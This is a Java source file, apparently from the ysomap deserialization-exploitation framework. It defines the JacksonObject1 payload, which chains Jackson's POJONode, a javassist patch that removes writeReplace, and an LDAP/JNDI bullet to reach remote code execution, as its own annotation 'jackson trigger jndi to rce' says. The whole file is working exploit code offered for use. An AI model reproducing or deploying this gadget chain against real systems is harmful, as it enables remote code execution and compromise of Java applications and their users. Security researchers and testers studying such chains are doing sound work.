package ysomap.payloads.java.jackson;

import com.fasterxml.jackson.databind.node.POJONode;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.LdapAttributeBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.payloads.AbstractPayload;

/**
 * @author whocansee
 * @since 2023/10/7
 * <a href="https://xz.aliyun.com/t/12846">...</a>
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.whocansee, Authors.TYSKILL })
@Targets({Targets.JDK})
@Require(bullets = {"LdapAttributeBullet"}, param = false)
@Dependencies({"jackson>=2.10.0"})
@Details("jackson trigger jndi to rce")
public class JacksonObject1 extends AbstractPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return LdapAttributeBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        javassist.ClassPool pool = javassist.ClassPool.getDefault();
        javassist.CtClass ctClass = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        javassist.CtMethod ctMethod = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(ctMethod);
        ctClass.toClass(); // 覆盖对象

        POJONode node = new POJONode(obj);
        return PayloadHelper.makeReadObjectToStringTrigger(node);
    }
}